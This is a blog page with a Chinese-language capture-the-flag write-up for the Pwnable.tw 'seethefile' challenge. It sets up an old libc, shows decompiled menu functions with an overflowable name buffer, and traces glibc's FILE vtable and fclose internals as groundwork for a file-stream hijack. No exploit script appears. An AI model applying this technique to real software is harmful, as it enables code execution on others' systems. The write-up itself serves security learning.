@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<!--Description-->
+
+
+
+    <meta name="description" content="Pwnable.tw-seethefile
+Author: 堇姬Naup
+
+libcglibc all in one 中沒有 2.23-0ubuntu5所以去網路上找libchttps://launchpad.net/ubuntu/xenial/i386/libc6/2.23-0ubuntu5
+把i"/>
+
+
+<!--Author-->
+
+    <meta name="author" content="Naup堇姬"/>
+
+
+<!--Open Graph Title-->
+
+    <meta property="og:title" content="Pwnable.tw-seethefile"/>
+
+
+<!--Open Graph Description-->
+
+    <meta property="og:description" content="Pwnable.tw-seethefile
+Author: 堇姬Naup
+
+libcglibc all in one 中沒有 2.23-0ubuntu5所以去網路上找libchttps://launchpad.net/ubuntu/xenial/i386/libc6/2.23-0ubuntu5
+把i"/>
+
+
+<!--Open Graph Site Name-->
+    <meta property="og:site_name" content="堇姬 Naup&#39;s Blog"/>
+
+<!--Type page-->
+
+    <meta property="og:type" content="article"/>
+
+
+<!--Page Cover-->
+
+
+    <meta property="og:image" content="http://example.com/img/bg4.jpg"/>
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+
+
+
+
+    <meta name="twitter:image" content="http://example.com/img/bg4.jpg"/>
+
+
+<!-- Title -->
+
+<title>Pwnable.tw-seethefile | 堇姬 Naup&#39;s Blog</title>
+
+<!-- Bootstrap Core CSS -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+
+<!-- Custom CSS -->
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<!-- Custom Fonts -->
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+
+<!-- Gallery -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">
+
+<!-- favicon -->
+
+<link rel="icon" href="/img/icon.jpg"/>
+
+
+
+    <!-- Google Analytics -->
+    
+
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+<!-- Head tag -->
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
+    <div class="container pl-0 pr-0">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <a class="navbar-brand text-white p-1 pl-3" href="/">堇姬 Naup's Blog</a>
+        </div>
+        <div class="navbar-nav float-right">
+            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/bg4.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 text-center">
+                <div class="post-heading text-white">
+                    <h1>Pwnable.tw-seethefile</h1>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+                
+                    <span class="meta d-inline-block">
+    
+    
+    <!-- Date -->
+    
+        <span class="post-meta-split">&nbsp;|&nbsp;</span>
+        <i class="far fa-calendar-check fa-fw"></i>
+        2024-09-20
+    
+    <!-- word count and read count -->
+    
+
+    
+
+    
+</span>  
+                
+                <h1 id="Pwnable-tw-seethefile"><a href="#Pwnable-tw-seethefile" class="headerlink" title="Pwnable.tw-seethefile"></a>Pwnable.tw-seethefile</h1><blockquote>
+<p>Author: 堇姬Naup</p>
+</blockquote>
+<h2 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h2><p>glibc all in one 中沒有 2.23-0ubuntu5<br>所以去網路上找libc<br><a target="_blank" rel="noopener" href="https://launchpad.net/ubuntu/xenial/i386/libc6/2.23-0ubuntu5">https://launchpad.net/ubuntu/xenial/i386/libc6/2.23-0ubuntu5</a></p>
+<p>把i386載下來</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -X libc6_2.23-0ubuntu5_i386.deb .</span><br></pre></td></tr></table></figure>
+<p>在libs裡面就有ld跟libc了</p>
+<p>patchelf直接patch上去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ld-2.23.so seethefile</span><br><span class="line">patchelf --replace-needed libc.so.6 ./libc-2.23.so seethefile</span><br></pre></td></tr></table></figure>
+
+<h2 id="IDA-分析"><a href="#IDA-分析" class="headerlink" title="IDA 分析"></a>IDA 分析</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp-Ch] [ebp-44h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-Ch] [ebp-44h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-8h] [ebp-40h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp-4h] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  init();</span><br><span class="line">  welcome();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v8);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(v8) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        openfile();</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        readfile();</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        writefile();</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        closefile();</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Leave your name :&quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thank you %s ,see you next time\n&quot;</span>, name);</span><br><span class="line">        <span class="keyword">if</span> ( fp )</span><br><span class="line">          fclose(fp);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>, v5, v6, v7);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">LABEL_10:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invaild choice&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>, v4, v6, v7);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;---------------MENU---------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  1. Open&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  2. Read&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  3. Write to screen&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  4. Close&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  5. Exit&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>五種功能<br>openfile<br>readfile<br>writefile<br>closefile<br>Exit</p>
+<p>Exit的地方會讓你輸入name，並print出來</p>
+<h3 id="openfile"><a href="#openfile" class="headerlink" title="openfile"></a>openfile</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">openfile</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp-Ch] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp-8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp-4h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( fp )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You need to close the file first&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;magicbuf, <span class="number">0</span>, <span class="number">400</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;What do you want to see :&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%63s&quot;</span>, &amp;filename);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(&amp;filename, <span class="string">&quot;flag&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Danger !&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>, v1, v2, v3);</span><br><span class="line">    &#125;</span><br><span class="line">    fp = fopen(&amp;filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( fp )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Open Successful&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Open failed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="readfile"><a href="#readfile" class="headerlink" title="readfile"></a>readfile</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">readfile</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;magicbuf, <span class="number">0</span>, <span class="number">400</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fp )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You need to open a file first&quot;</span>);</span><br><span class="line">  result = fread(&amp;magicbuf, <span class="number">399</span>, <span class="number">1</span>, fp);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Read Successful&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="writefile"><a href="#writefile" class="headerlink" title="writefile"></a>writefile</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">writefile</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp-Ch] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp-8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp-4h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(&amp;filename, <span class="string">&quot;flag&quot;</span>) || <span class="built_in">strstr</span>(&amp;magicbuf, <span class="string">&quot;FLAG&quot;</span>) || <span class="built_in">strchr</span>(&amp;magicbuf, <span class="number">125</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you can&#x27;t see it&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>, v1, v2, v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;magicbuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="closefile"><a href="#closefile" class="headerlink" title="closefile"></a>closefile</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">closefile</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( fp )</span><br><span class="line">    result = fclose(fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Nothing need to close&quot;</span>);</span><br><span class="line">  fp = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="vtable"><a href="#vtable" class="headerlink" title="vtable"></a>vtable</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">40</span>xw <span class="number">0xf7fccac0</span></span><br><span class="line"><span class="number">0xf7fccac0</span> &lt;_IO_file_jumps&gt;:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0xf7e85d80</span>	<span class="number">0xf7e86760</span></span><br><span class="line"><span class="number">0xf7fccad0</span> &lt;_IO_file_jumps+<span class="number">16</span>&gt;:	<span class="number">0xf7e86500</span>	<span class="number">0xf7e875d0</span>	<span class="number">0xf7e88460</span>	<span class="number">0xf7e859f0</span></span><br><span class="line"><span class="number">0xf7fccae0</span> &lt;_IO_file_jumps+<span class="number">32</span>&gt;:	<span class="number">0xf7e85610</span>	<span class="number">0xf7e848b0</span>	<span class="number">0xf7e87870</span>	<span class="number">0xf7e846f0</span></span><br><span class="line"><span class="number">0xf7fccaf0</span> &lt;_IO_file_jumps+<span class="number">48</span>&gt;:	<span class="number">0xf7e845e0</span>	<span class="number">0xf7e79db0</span>	<span class="number">0xf7e859a0</span>	<span class="number">0xf7e85460</span></span><br><span class="line"><span class="number">0xf7fccb00</span> &lt;_IO_file_jumps+<span class="number">64</span>&gt;:	<span class="number">0xf7e851a0</span>	<span class="number">0xf7e846c0</span>	<span class="number">0xf7e85440</span>	<span class="number">0xf7e885f0</span></span><br><span class="line"><span class="number">0xf7fccb10</span> &lt;_IO_file_jumps+<span class="number">80</span>&gt;:	<span class="number">0xf7e88600</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="fclose-and-fininsh-source-code"><a href="#fclose-and-fininsh-source-code" class="headerlink" title="fclose and __fininsh source code"></a>fclose and __fininsh source code</h2><p>宣告fclose<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/stdio.h#L213">https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/stdio.h#L213</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Close STREAM.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This function is a possible cancellation point and therefore not</span></span><br><span class="line"><span class="comment">   marked with __THROW.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">fclose</span> <span class="params">(FILE *__stream)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>call fclose 會進到 _IO_new_fclose<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/iofclose.c">https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/iofclose.c</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment">	 the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.step);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.step);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">	_IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_deallocate_file (fp);</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先他call _IO_un_link<br>將 fp 移出鏈表</p>
+<p>之後調用 _IO_FINISH 一樣經過了一堆 macro後，他 call 到 _IO_new_file_finish</p>
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/fileops.c#L167">https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/fileops.c#L167</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_do_flush (fp);</span><br><span class="line">      <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))</span><br><span class="line">	_IO_SYSCLOSE (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_finish, _IO_file_finish)</span><br></pre></td></tr></table></figure>
+
+<p>他會去刷新buffer，並syscall close</p>
+<p>大致上就是</p>
+<ul>
+<li>從 _IO_list_all 中移除fp</li>
+<li>call vtable 中 _IO_FINISH (_IO_new_file_finish)</li>
+<li>flush buffer</li>
+<li>_IO_SYSCLOSE</li>
+<li>free</li>
+</ul>
